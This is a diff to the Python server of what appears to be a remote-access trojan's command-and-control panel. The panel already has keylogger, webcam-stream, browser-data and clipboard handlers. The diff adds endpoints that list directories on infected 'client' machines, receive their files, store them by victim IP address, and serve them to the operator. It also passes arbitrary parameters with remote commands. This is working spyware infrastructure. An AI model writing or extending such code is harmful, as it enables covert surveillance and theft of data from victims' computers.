@@ -3,12 +3,13 @@ import json
 import logging
 import os
 import threading
+import time
 from datetime import datetime
 from logging.handlers import RotatingFileHandler
 from queue import Queue
 
 import click
-from flask import Flask, request, send_file, Response
+from flask import Flask, request, send_file, Response, jsonify
 from flask_jwt_extended import create_access_token, jwt_required, JWTManager
 from flask_migrate import Migrate
 from flask_restx import Api, Resource, fields
@@ -50,6 +51,8 @@ browser_ns = api.namespace('api/v1/browser', description='Browser data operation
 keylogger_ns = api.namespace('api/v1/keylogger', description='Keylogger operations')
 webcam_ns = api.namespace('api/v1/webcam', description='Webcam operations')
 papier_ns = api.namespace('api/v1/papier', description='Papier operations')
+download_file_ns = api.namespace('api/v1/download', description='Download file operations')
+directory_ns = api.namespace('api/v1/directory', description='Directory operations')
 
 auth_model = api.model('Auth', {'secret_key': fields.String(required=True, description='Clé secrète')})
 command_model = api.model('Command', {
@@ -91,6 +94,14 @@ papier_model = api.model('Papier', {
     'id': fields.Integer(required=True, description='ID du papier'),
     'file_path': fields.String(required=True, description='Chemin du fichier du papier'),
     'date_created': fields.String(required=True, description='Date de création du papier')
+})
+download_file_model = api.model('DownloadFile', {
+    'id': fields.Integer(required=True, description='ID du fichier'),
+    'file_path': fields.String(required=True, description='Chemin du fichier'),
+    'date_created': fields.String(required=True, description='Date de création du fichier')
+})
+directory_model = api.model('Directory', {
+    'dir_path': fields.String(required=True, description='Chemin du répertoire à lister')
 })
 
 client_params = api.parser()
@@ -170,11 +181,9 @@ class HandleCommand(Resource):
                 app.logger.error("Paramètres mal formés (JSON invalide).")
                 return {'status': 'error', 'message': 'Paramètres mal formés (JSON invalide).'}, 400
 
-        duration = params.get('duration', 10) if isinstance(params, dict) else 10
-
         client = Client.query.get(client_id)
         if client and client.status == 'online':
-            socketio.emit('command', {'command': command, 'params': duration}, room=client.sid)
+            socketio.emit('command', {'command': command, 'params': params}, room=client.sid)
             app.logger.info(f"Commande *{command}* envoyée au client {client_id} / {client.ip}.")
             return {'status': 'success',
                     'message': f'Commande *{command}* envoyée au **client {client_id} / {client.ip}**.'}, 200
@@ -366,6 +375,74 @@ class StreamWebcam(Resource):
         return Response(stream_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 
+@directory_ns.route('/client/<int:client_id>')
+class ListDirectory(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    @directory_ns.expect(directory_model)
+    def post(self, client_id):
+        data = request.json
+        dir_path = data.get('dir_path')
+        if not dir_path:
+            return {'status': 'error', 'message': 'Chemin du répertoire non spécifié.'}, 400
+
+        client = Client.query.get(client_id)
+        if client and client.status == 'online':
+            socketio.emit('list_directory', {'dir_path': dir_path}, room=client.sid)
+            app.logger.info(f"Commande *list_directory* envoyée au client {client_id} / {client.ip}.")
+
+            start_time = time.time()
+            timeout = 10
+            while time.time() - start_time < timeout:
+                socketio.sleep(1)
+                if hasattr(socketio, 'last_directory_listing'):
+                    response = socketio.last_directory_listing
+                    del socketio.last_directory_listing
+
+                    if db.session.query(Command).filter_by(dir_path=dir_path).count() == 0:
+                        new_command = Command(
+                            type=CommandType.DIRECTORY_LISTING,
+                            client_id=client_id,
+                            dir_path=dir_path,
+                            date_created=datetime.now()
+                        )
+                        db.session.add(new_command)
+                        db.session.commit()
+
+                    return jsonify(response)
+
+            return {'status': 'error', 'message': 'Timeout waiting for directory listing response.'}, 504
+
+        elif client and client.status == 'offline':
+            return {'status': 'error', 'message': 'Client hors ligne.'}, 400
+        else:
+            return {'status': 'error', 'message': 'Client non trouvé.'}, 404
+
+
+@download_file_ns.route('/client/<int:client_id>')
+class ListDownloadFile(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    @download_file_ns.marshal_with(download_file_model, as_list=True)
+    def get(self, client_id):
+        download_files = Command.query.filter_by(client_id=client_id, type=CommandType.DOWNLOAD_FILE).all()
+        for download_file in download_files:
+            download_file.date_created = download_file.date_created.strftime('%d/%m/%Y à %H:%M:%S')
+        return download_files, 200
+
+
+@download_file_ns.route('/file/<int:download_file_id>')
+class GetDownloadFile(Resource):
+    @jwt_required()
+    @api.doc(security='bearer_auth')
+    def get(self, download_file_id):
+        download_file = Command.query.get(download_file_id)
+        if download_file and os.path.exists(download_file.file_path):
+            return send_file(download_file.file_path)
+        else:
+            return {'status': 'error', 'message': 'Fichier non trouvé.'}, 404
+
+
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -505,6 +582,35 @@ def handle_clipboard(data):
 def handle_frame(data):
     frame_data = base64.b64decode(data.get('data'))
     video_frames.put(frame_data)
+
+
+@socketio.on('file_response')
+def handle_file(data):
+    file_data = base64.b64decode(data.get('file'))
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        client_ip = client.ip
+        file_dir = f"download_files/{client_ip}"
+        os.makedirs(file_dir, exist_ok=True)
+        file_name = data.get('file_name')
+        file_path = f"{file_dir}/{file_name}"
+        with open(file_path, 'wb') as f:
+            f.write(file_data)
+        new_command = Command(type=CommandType.DOWNLOAD_FILE, client_id=client.id, file_path=file_path)
+        db.session.add(new_command)
+        db.session.commit()
+        app.logger.info(f"Fichier reçu de {client_ip} et enregistré sous {file_path}")
+
+
+@socketio.on('directory_listing_response')
+def handle_directory_listing(data):
+    directory_listing = data.get('directory_listing')
+    sid = request.sid
+    client = Client.query.filter_by(sid=sid).first()
+    if client:
+        socketio.last_directory_listing = directory_listing
+        app.logger.info(f"Liste des répertoires reçue de {client.ip}")
 
 
 @socketio.on('disconnect')
